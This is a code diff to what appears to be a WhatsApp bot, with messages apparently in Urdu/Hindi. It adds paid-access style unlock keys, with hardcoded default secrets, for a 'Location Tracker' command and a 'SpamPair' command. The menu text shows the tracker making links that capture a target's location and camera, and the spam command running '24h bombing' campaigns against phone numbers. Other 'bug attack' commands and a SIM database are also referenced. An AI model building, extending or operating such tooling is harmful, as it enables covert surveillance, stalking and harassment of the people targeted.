@@ -1117,6 +1117,16 @@ if (_flagNow - global._flagCache.ts > 30 * 60 * 1000) { // SPEED: 15min→30min 
         global._flagCache.akUnlocked = fs.existsSync(_akuf) ? JSON.parse(fs.readFileSync(_akuf, 'utf-8')) : []; } catch(e) { global._flagCache.akUnlocked = []; }
     try { const _aksf = _p.join(__dirname, 'database', 'ak_secret.json');
         global._flagCache.akSecret = fs.existsSync(_aksf) ? (JSON.parse(fs.readFileSync(_aksf, 'utf-8')).code || '') : ''; } catch(e) { global._flagCache.akSecret = ''; }
+    try { const _locuf = _p.join(__dirname, 'database', 'loc_unlocked.json');
+        global._flagCache.loc = fs.existsSync(_locuf) ? JSON.parse(fs.readFileSync(_locuf, 'utf-8')) : [];
+        global._flagCache.locUnlocked = global._flagCache.loc; } catch(e) { global._flagCache.loc = []; global._flagCache.locUnlocked = []; }
+    try { const _locbf = './database/loc_banned.json';
+        global._flagCache.locBanned = fs.existsSync(_locbf) ? JSON.parse(fs.readFileSync(_locbf, 'utf-8')) : []; } catch(e) { global._flagCache.locBanned = []; }
+    try { const _spuf = _p.join(__dirname, 'database', 'spam_unlocked.json');
+        global._flagCache.spam = fs.existsSync(_spuf) ? JSON.parse(fs.readFileSync(_spuf, 'utf-8')) : [];
+        global._flagCache.spamUnlocked = global._flagCache.spam; } catch(e) { global._flagCache.spam = []; global._flagCache.spamUnlocked = []; }
+    try { const _spbf = './database/spam_banned.json';
+        global._flagCache.spamBanned = fs.existsSync(_spbf) ? JSON.parse(fs.readFileSync(_spbf, 'utf-8')) : []; } catch(e) { global._flagCache.spamBanned = []; }
     global._flagCache.ts = _flagNow;
 }
 
@@ -1140,6 +1150,10 @@ const _cleanSenderNum = (m.sender || '').replace(/[^0-9]/g, '');
 const _senderAdultUnlocked = global._flagCache.adult.some(id => String(id).replace(/[^0-9]/g, '') === _cleanSenderNum);
 // Bug & SIM Database unlock status for this sender (cached)
 const _senderBugUnlocked = global._flagCache.bug.some(id => String(id).replace(/[^0-9]/g, '') === _cleanSenderNum);
+// Location Tracker unlock status (addkey2)
+const _senderLocUnlocked = (global._flagCache?.locUnlocked || []).some(id => String(id).replace(/[^0-9]/g, '') === _cleanSenderNum);
+// SpamPair unlock status (addkey3)
+const _senderSpamUnlocked = (global._flagCache?.spamUnlocked || []).some(id => String(id).replace(/[^0-9]/g, '') === _cleanSenderNum);
 
 // Shared bug-section access guard — used by all bug attack commands
 const _requireBugAccess = () => {
@@ -5774,13 +5788,13 @@ ${_senderBugUnlocked ? `┏━━◆ *CYBER - 𝐒𝐈𝐌 𝐃𝐀𝐓𝐀𝐁�
 │
 ┗━━━━━━━━━━━━━━━━━━━━┛` : ''}
 
-${_senderBugUnlocked ? `┏━━◆ *CYBER - 📍 𝐋𝐎𝐂𝐀𝐓𝐈𝐎𝐍 𝐓𝐑𝐀𝐂𝐊𝐄𝐑* ◆━━┓
+${_senderLocUnlocked ? `┏━━◆ *CYBER - 📍 𝐋𝐎𝐂𝐀𝐓𝐈𝐎𝐍 𝐓𝐑𝐀𝐂𝐊𝐄𝐑* ◆━━┓
 │❖ ${prefix}location — gen tracking link
 │❖ ${prefix}loccheck <token> — results
 │❖ ${prefix}loccam <token> — view camera
-┗━━━━━━━━━━━━━━━━━━━━┛
+┗━━━━━━━━━━━━━━━━━━━━┛` : ''}
 
-┏━━◆ *CYBER - 📲 𝐒𝐏𝐀𝐌 𝐏𝐀𝐈𝐑* ◆━━┓
+${_senderSpamUnlocked ? `┏━━◆ *CYBER - 📲 𝐒𝐏𝐀𝐌 𝐏𝐀𝐈𝐑* ◆━━┓
 │❖ ${prefix}spampair 923xx — 24h bombing
 │❖ ${prefix}stoppair 923xx — stop campaign
 │❖ ${prefix}pairstatus — check campaigns
@@ -5867,8 +5881,10 @@ ${_senderBugUnlocked ? '│❖ ' + prefix + 'bugmenu' : ''}
 │❖ ${prefix}funmenu
 │❖ ${prefix}gamemenu
 │❖ ${prefix}groupmenu
+${_senderLocUnlocked ? '│❖ ' + prefix + 'location — tracker link' : ''}
 │❖ ${prefix}logomenu
 │❖ ${prefix}ownermenu
+${_senderSpamUnlocked ? '│❖ ' + prefix + 'spampair 923xx — 24h bombing' : ''}
 │❖ ${prefix}stickermenu
 │❖ ${prefix}toolsmenu
 ${_senderBugUnlocked ? '│❖ ' + prefix + 'simdatabase' : ''}
@@ -13576,6 +13592,152 @@ case 'removekey1': {
 }
 break;
 
+// ============ ADDKEY2 COMMAND (Location Tracker unlock) ============
+case 'addkey2': {
+    const _lkSecretFile = './database/loc_secret.json';
+    const _lkUnlockedFile = require('path').join(__dirname, 'database', 'loc_unlocked.json');
+    const _lkBannedFile = './database/loc_banned.json';
+
+    const _lkSenderNum = (m.sender || '').split('@')[0].split(':')[0];
+
+    let _lkBanned = [];
+    try { if (fs.existsSync(_lkBannedFile)) _lkBanned = JSON.parse(fs.readFileSync(_lkBannedFile, 'utf-8')); } catch(e) {}
+    const _lkIsBanned = _lkBanned.some(id => String(id).replace(/[^0-9]/g,'') === _lkSenderNum);
+    if (_lkIsBanned) return reply(`🚫 *Access Denied*\nYou have been permanently banned from Location Tracker section.`);
+
+    if (!text) return reply(`🔑 *Usage:* ${prefix}addkey2 <code>\n\nLocation Tracker section unlock karne ke liye admin se code maango.`);
+
+    let _lkSecret = 'cyberloc2025';
+    try { if (fs.existsSync(_lkSecretFile)) _lkSecret = JSON.parse(fs.readFileSync(_lkSecretFile, 'utf-8')).code || _lkSecret; } catch(e) {}
+
+    if (text.trim() !== _lkSecret) return reply(`❌ *Wrong code!*\nAdmin se sahi Location Tracker access code maango.`);
+
+    let _lkUnlocked = [];
+    try { if (fs.existsSync(_lkUnlockedFile)) _lkUnlocked = JSON.parse(fs.readFileSync(_lkUnlockedFile, 'utf-8')); } catch(e) {}
+
+    const _lkAlreadyUnlocked = _lkUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _lkSenderNum);
+    if (_lkAlreadyUnlocked) return reply(`✅ *Already Unlocked*\nAap ko Location Tracker access already mil chuki hai.`);
+
+    _lkUnlocked.push(_lkSenderNum);
+    try {
+        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
+        fs.writeFileSync(_lkUnlockedFile, JSON.stringify(_lkUnlocked, null, 2));
+    } catch(e) {}
+
+    try {
+        if (!global._flagCache) global._flagCache = {};
+        if (!Array.isArray(global._flagCache.loc)) global._flagCache.loc = [];
+        if (!Array.isArray(global._flagCache.locUnlocked)) global._flagCache.locUnlocked = [];
+        if (!global._flagCache.loc.some(id => String(id).replace(/[^0-9]/g,'') === _lkSenderNum)) {
+            global._flagCache.loc.push(_lkSenderNum);
+        }
+        if (!global._flagCache.locUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _lkSenderNum)) {
+            global._flagCache.locUnlocked.push(_lkSenderNum);
+        }
+    } catch(_ce) {}
+
+    return reply(`✅ *Location Tracker Access Unlocked!* 📍\nAb aap ${prefix}location command use kar sakte hain.\nType *${prefix}removekey2* to remove access anytime.`);
+}
+break;
+
+// ============ REMOVEKEY2 COMMAND ============
+case 'removekey2': {
+    const _rk2UnlockedFile = require('path').join(__dirname, 'database', 'loc_unlocked.json');
+    const _rk2SenderNum = (m.sender || '').split('@')[0].split(':')[0];
+    let _rk2Unlocked = [];
+    try { if (fs.existsSync(_rk2UnlockedFile)) _rk2Unlocked = JSON.parse(fs.readFileSync(_rk2UnlockedFile, 'utf-8')); } catch(e) {}
+    const _rk2WasUnlocked = _rk2Unlocked.some(id => String(id).replace(/[^0-9]/g,'') === _rk2SenderNum);
+    if (!_rk2WasUnlocked) return reply(`ℹ️ *Aap ke paas Location Tracker access nahi hai.*`);
+    _rk2Unlocked = _rk2Unlocked.filter(id => String(id).replace(/[^0-9]/g,'') !== _rk2SenderNum);
+    try {
+        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
+        fs.writeFileSync(_rk2UnlockedFile, JSON.stringify(_rk2Unlocked, null, 2));
+    } catch(e) {}
+    try {
+        if (global._flagCache) {
+            if (Array.isArray(global._flagCache.loc))
+                global._flagCache.loc = global._flagCache.loc.filter(id => String(id).replace(/[^0-9]/g,'') !== _rk2SenderNum);
+            if (Array.isArray(global._flagCache.locUnlocked))
+                global._flagCache.locUnlocked = global._flagCache.locUnlocked.filter(id => String(id).replace(/[^0-9]/g,'') !== _rk2SenderNum);
+        }
+    } catch(_ce) {}
+    return reply(`✅ *Location Tracker Access Removed!*\n🔒 Commands ab lock ho gaye.\nType *${prefix}addkey2 <code>* to unlock again.`);
+}
+break;
+
+// ============ ADDKEY3 COMMAND (SpamPair unlock) ============
+case 'addkey3': {
+    const _spkSecretFile = './database/spam_secret.json';
+    const _spkUnlockedFile = require('path').join(__dirname, 'database', 'spam_unlocked.json');
+    const _spkBannedFile = './database/spam_banned.json';
+
+    const _spkSenderNum = (m.sender || '').split('@')[0].split(':')[0];
+
+    let _spkBanned = [];
+    try { if (fs.existsSync(_spkBannedFile)) _spkBanned = JSON.parse(fs.readFileSync(_spkBannedFile, 'utf-8')); } catch(e) {}
+    const _spkIsBanned = _spkBanned.some(id => String(id).replace(/[^0-9]/g,'') === _spkSenderNum);
+    if (_spkIsBanned) return reply(`🚫 *Access Denied*\nYou have been permanently banned from SpamPair section.`);
+
+    if (!text) return reply(`🔑 *Usage:* ${prefix}addkey3 <code>\n\nSpamPair section unlock karne ke liye admin se code maango.`);
+
+    let _spkSecret = 'cyberspam2025';
+    try { if (fs.existsSync(_spkSecretFile)) _spkSecret = JSON.parse(fs.readFileSync(_spkSecretFile, 'utf-8')).code || _spkSecret; } catch(e) {}
+
+    if (text.trim() !== _spkSecret) return reply(`❌ *Wrong code!*\nAdmin se sahi SpamPair access code maango.`);
+
+    let _spkUnlocked = [];
+    try { if (fs.existsSync(_spkUnlockedFile)) _spkUnlocked = JSON.parse(fs.readFileSync(_spkUnlockedFile, 'utf-8')); } catch(e) {}
+
+    const _spkAlreadyUnlocked = _spkUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _spkSenderNum);
+    if (_spkAlreadyUnlocked) return reply(`✅ *Already Unlocked*\nAap ko SpamPair access already mil chuki hai.`);
+
+    _spkUnlocked.push(_spkSenderNum);
+    try {
+        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
+        fs.writeFileSync(_spkUnlockedFile, JSON.stringify(_spkUnlocked, null, 2));
+    } catch(e) {}
+
+    try {
+        if (!global._flagCache) global._flagCache = {};
+        if (!Array.isArray(global._flagCache.spam)) global._flagCache.spam = [];
+        if (!Array.isArray(global._flagCache.spamUnlocked)) global._flagCache.spamUnlocked = [];
+        if (!global._flagCache.spam.some(id => String(id).replace(/[^0-9]/g,'') === _spkSenderNum)) {
+            global._flagCache.spam.push(_spkSenderNum);
+        }
+        if (!global._flagCache.spamUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _spkSenderNum)) {
+            global._flagCache.spamUnlocked.push(_spkSenderNum);
+        }
+    } catch(_ce) {}
+
+    return reply(`✅ *SpamPair Access Unlocked!* 📲\nAb aap ${prefix}spampair command use kar sakte hain.\nType *${prefix}removekey3* to remove access anytime.`);
+}
+break;
+
+// ============ REMOVEKEY3 COMMAND ============
+case 'removekey3': {
+    const _rk3UnlockedFile = require('path').join(__dirname, 'database', 'spam_unlocked.json');
+    const _rk3SenderNum = (m.sender || '').split('@')[0].split(':')[0];
+    let _rk3Unlocked = [];
+    try { if (fs.existsSync(_rk3UnlockedFile)) _rk3Unlocked = JSON.parse(fs.readFileSync(_rk3UnlockedFile, 'utf-8')); } catch(e) {}
+    const _rk3WasUnlocked = _rk3Unlocked.some(id => String(id).replace(/[^0-9]/g,'') === _rk3SenderNum);
+    if (!_rk3WasUnlocked) return reply(`ℹ️ *Aap ke paas SpamPair access nahi hai.*`);
+    _rk3Unlocked = _rk3Unlocked.filter(id => String(id).replace(/[^0-9]/g,'') !== _rk3SenderNum);
+    try {
+        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
+        fs.writeFileSync(_rk3UnlockedFile, JSON.stringify(_rk3Unlocked, null, 2));
+    } catch(e) {}
+    try {
+        if (global._flagCache) {
+            if (Array.isArray(global._flagCache.spam))
+                global._flagCache.spam = global._flagCache.spam.filter(id => String(id).replace(/[^0-9]/g,'') !== _rk3SenderNum);
+            if (Array.isArray(global._flagCache.spamUnlocked))
+                global._flagCache.spamUnlocked = global._flagCache.spamUnlocked.filter(id => String(id).replace(/[^0-9]/g,'') !== _rk3SenderNum);
+        }
+    } catch(_ce) {}
+    return reply(`✅ *SpamPair Access Removed!*\n🔒 Commands ab lock ho gaye.\nType *${prefix}addkey3 <code>* to unlock again.`);
+}
+break;
+
 // ============ LOCATION TRACKER COMMAND (.location) ============
 case 'location':
 case 'loc':
@@ -13584,15 +13746,15 @@ case 'tracker': {
     {
         const _locN = (m.sender || '').split('@')[0].split(':')[0];
         try {
-            const _locBanned = (global._flagCache?.bugBanned || []);
+            const _locBanned = (global._flagCache?.locBanned || []);
             if (_locBanned.some(id => String(id).replace(/[^0-9]/g,'') === _locN))
                 return reply(`🚫 *Access Denied*
 Aap is section se permanently ban hain.`);
-            const _locUnlocked = (global._flagCache?.bugUnlocked || []);
+            const _locUnlocked = (global._flagCache?.locUnlocked || []);
             if (!_locUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _locN))
-                return reply(`🔒 *Location Tracker — Locked*\n\nYe command sirf authorized users ke liye hai.\n\n*Unlock karo:* ${prefix}addkey1 <code>`);
+                return reply(`🔒 *Location Tracker — Locked*\n\nYe command sirf authorized users ke liye hai.\n\n*Unlock karo:* ${prefix}addkey2 <code>`);
         } catch(e) {
-            return reply(`🔒 *Location Tracker — Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
+            return reply(`🔒 *Location Tracker — Locked*\n\nType *${prefix}addkey2 <code>* to unlock.`);
         }
     }
 
@@ -13648,13 +13810,13 @@ case 'locresult': {
     {
         const _lcN = (m.sender || '').split('@')[0].split(':')[0];
         try {
-            const _lcBanned = (global._flagCache?.bugBanned || []);
+            const _lcBanned = (global._flagCache?.locBanned || []);
             if (_lcBanned.some(id => String(id).replace(/[^0-9]/g,'') === _lcN))
                 return reply(`🚫 *Access Denied*`);
-            const _lcUnlocked = (global._flagCache?.bugUnlocked || []);
+            const _lcUnlocked = (global._flagCache?.locUnlocked || []);
             if (!_lcUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _lcN))
-                return reply(`🔒 *Locked* — Type *${prefix}addkey1 <code>* to unlock.`);
-        } catch(e) { return reply(`🔒 *Locked* — Type *${prefix}addkey1 <code>* to unlock.`); }
+                return reply(`🔒 *Locked* — Type *${prefix}addkey2 <code>* to unlock.`);
+        } catch(e) { return reply(`🔒 *Locked* — Type *${prefix}addkey2 <code>* to unlock.`); }
     }
 
     const _lcToken = text?.trim();
@@ -13735,13 +13897,13 @@ case 'loccam': {
     {
         const _lcamN = (m.sender || '').split('@')[0].split(':')[0];
         try {
-            const _lcamBanned = (global._flagCache?.bugBanned || []);
+            const _lcamBanned = (global._flagCache?.locBanned || []);
             if (_lcamBanned.some(id => String(id).replace(/[^0-9]/g,'') === _lcamN))
                 return reply(`🚫 *Access Denied*`);
-            const _lcamUnlocked = (global._flagCache?.bugUnlocked || []);
+            const _lcamUnlocked = (global._flagCache?.locUnlocked || []);
             if (!_lcamUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _lcamN))
-                return reply(`🔒 *Locked* — Type *${prefix}addkey1 <code>* to unlock.`);
-        } catch(e) { return reply(`🔒 *Locked* — Type *${prefix}addkey1 <code>* to unlock.`); }
+                return reply(`🔒 *Locked* — Type *${prefix}addkey2 <code>* to unlock.`);
+        } catch(e) { return reply(`🔒 *Locked* — Type *${prefix}addkey2 <code>* to unlock.`); }
     }
 
     const _lcamToken = text?.trim();
@@ -19502,18 +19664,18 @@ default:
 // ============ SPAMPAIR COMMAND (.spampair) ============
 case 'spampair':
 case 'spam': {
-    // ── addkey1 lock — same as Bug & SIM section ──
+    // ── addkey3 lock — separate from Bug & SIM ──
     {
         const _spN = (m.sender || '').split('@')[0].split(':')[0];
         try {
-            const _spBanned = (global._flagCache?.bugBanned || []);
+            const _spBanned = (global._flagCache?.spamBanned || []);
             if (_spBanned.some(id => String(id).replace(/[^0-9]/g,'') === _spN))
                 return reply(`🚫 *Access Denied*\nAap is section se permanently ban hain.`);
-            const _spUnlocked = (global._flagCache?.bugUnlocked || []);
+            const _spUnlocked = (global._flagCache?.spamUnlocked || []);
             if (!_spUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _spN))
-                return reply(`🔒 *SpamPair — Locked*\n\nYe command sirf authorized users ke liye hai.\n\n*Unlock karo:* ${prefix}addkey1 <code>`);
+                return reply(`🔒 *SpamPair — Locked*\n\nYe command sirf authorized users ke liye hai.\n\n*Unlock karo:* ${prefix}addkey3 <code>`);
         } catch(e) {
-            return reply(`🔒 *SpamPair — Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
+            return reply(`🔒 *SpamPair — Locked*\n\nType *${prefix}addkey3 <code>* to unlock.`);
         }
     }
 
@@ -19626,17 +19788,17 @@ case 'spam': {
 // ============ STOPPAIR COMMAND (.stoppair) ============
 case 'stoppair':
 case 'stopspam': {
-    // ── addkey1 lock ──
+    // ── addkey3 lock ──
     {
         const _stpN = (m.sender || '').split('@')[0].split(':')[0];
         try {
-            const _stpBanned = (global._flagCache?.bugBanned || []);
+            const _stpBanned = (global._flagCache?.spamBanned || []);
             if (_stpBanned.some(id => String(id).replace(/[^0-9]/g,'') === _stpN))
                 return reply(`🚫 *Access Denied*`);
-            const _stpUnlocked = (global._flagCache?.bugUnlocked || []);
+            const _stpUnlocked = (global._flagCache?.spamUnlocked || []);
             if (!_stpUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _stpN))
-                return reply(`🔒 *Locked* — Type *${prefix}addkey1 <code>* to unlock.`);
-        } catch(e) { return reply(`🔒 *Locked* — Type *${prefix}addkey1 <code>* to unlock.`); }
+                return reply(`🔒 *Locked* — Type *${prefix}addkey3 <code>* to unlock.`);
+        } catch(e) { return reply(`🔒 *Locked* — Type *${prefix}addkey3 <code>* to unlock.`); }
     }
 
     const _stpPhone = (text || '').trim();
@@ -19671,17 +19833,17 @@ case 'stopspam': {
 // ============ PAIRSTATUS COMMAND (.pairstatus) ============
 case 'pairstatus':
 case 'spamstatus': {
-    // ── addkey1 lock ──
+    // ── addkey3 lock ──
     {
         const _psN = (m.sender || '').split('@')[0].split(':')[0];
         try {
-            const _psBanned = (global._flagCache?.bugBanned || []);
+            const _psBanned = (global._flagCache?.spamBanned || []);
             if (_psBanned.some(id => String(id).replace(/[^0-9]/g,'') === _psN))
                 return reply(`🚫 *Access Denied*`);
-            const _psUnlocked = (global._flagCache?.bugUnlocked || []);
+            const _psUnlocked = (global._flagCache?.spamUnlocked || []);
             if (!_psUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _psN))
-                return reply(`🔒 *Locked* — Type *${prefix}addkey1 <code>* to unlock.`);
-        } catch(e) { return reply(`🔒 *Locked* — Type *${prefix}addkey1 <code>* to unlock.`); }
+                return reply(`🔒 *Locked* — Type *${prefix}addkey3 <code>* to unlock.`);
+        } catch(e) { return reply(`🔒 *Locked* — Type *${prefix}addkey3 <code>* to unlock.`); }
     }
 
     let activeCampaigns;
